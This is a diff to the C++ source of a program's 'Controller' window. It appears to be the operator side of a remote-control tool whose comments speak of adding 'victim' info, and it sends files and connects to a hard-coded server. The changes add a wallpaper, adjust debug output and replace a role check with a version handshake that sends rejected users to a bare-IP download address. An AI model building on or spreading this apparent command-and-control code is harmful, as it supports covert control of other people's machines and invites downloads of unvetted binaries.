@@ -1,7 +1,7 @@
 #include "controller.h"
 
 Controller::Controller()
-{
+{    
     font.loadFromFile("./font.ttf");
     //if needed create the file
     std::ofstream createFile("./ccontext.txt", std::ios::app);
@@ -53,6 +53,12 @@ void Controller::controlWindow()
                 w.create(sf::VideoMode::getFullscreenModes()[0], "Controller", sf::Style::Fullscreen);
                 w.setView(sf::View(sf::Vector2f(960, 540), sf::Vector2f(1920, 1080)));
                 w.setFramerateLimit(20);
+
+                if (!wallpaper.loadFromFile("./wallpaper.png")) {
+                    sf::Image img;
+                    img.create(w.getSize().x, w.getSize().y, sf::Color::Black);
+                    wallpaper.loadFromImage(img);
+                }   
             }
             //reconnect with server if needed
             else if (isRunning && !isConnected) {
@@ -194,7 +200,9 @@ void Controller::controlWindow()
             keys[i] = state;
         }
 
-        w.clear(sf::Color(60, 60, 60));
+        sf::RectangleShape rect(sf::Vector2f(w.getSize()));
+        rect.setTexture(&wallpaper);
+        w.draw(rect);
 
         std::string str("SETTINGS [ins] = ");
         str += ((areSettingsOpen) ? "OPEN\n" : "CLOSED\n");
@@ -205,7 +213,7 @@ void Controller::controlWindow()
         str += "FILE [3] = ";
         if (fileState == -1)
             str += "READY";
-        else if (fileState == -2)
+        else if (fileState == -2) 
             str += "SENT - READY";
         else if (fileState == -3)
             str += "FAILED - READY";
@@ -235,6 +243,8 @@ void Controller::receiveInfo()
 
         sf::Uint8 cmd;
         p >> cmd;
+
+        std::cout << cmd;
 
         //add new controller/victim info
         if (cmd == 'n' || cmd == 'l') {
@@ -548,7 +558,6 @@ void Controller::takeCmdInput()
             while (pass.size() > 0 && pass[pass.size() - 1] == ' ')
                 pass.erase(pass.begin() + pass.size() - 1);
 
-            std::cout << num;
             //check if controller with that id exists
             for (const auto& c : controllers) {
                 if (c.id != num)
@@ -557,7 +566,6 @@ void Controller::takeCmdInput()
                 sf::Packet p;
                 p << sf::Uint8('q') << c.id << pass;
                 sendServer(p);
-                std::cout << "SENT";
                 break;
             }
         }
@@ -571,9 +579,10 @@ connect:
     while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
     std::cout << "connected with server\n";
 
+    int fails = 0;
 init:
     sf::Packet p;
-    p << sf::Uint8('c') << name;
+    p << sf::Uint8(CONTROLLER_VERSION) << name;
     //tell server the role and the name
     if (sendServer(p) == sf::Socket::Disconnected)
         goto connect;
@@ -581,11 +590,23 @@ init:
     p.clear();
     if (server.receive(p) == sf::Socket::Disconnected)
         goto connect;
-    sf::Uint8 role = '-';
-    //check if the server has initialized the controller, else try again
-    p >> role;
-    if (role != 'c')
-        goto init;
+
+    sf::Uint8 version = 0;
+    p >> version;
+    if (version != CONTROLLER_VERSION) {
+        std::cout << int(version) << "\n";
+        if (fails < 20) {
+            fails++;
+            goto init;
+        }
+        else {
+            std::cout << "server rejected the connection. try downloading a newer ";
+            std::cout << "controller version from http://34.154.107.102:8000\n";
+            while (true)
+                Mlib::sleep(Mlib::seconds(10));
+        }
+    }
+
     //get the connection id
     p >> id;
     std::cout << "connection with server approved\n";
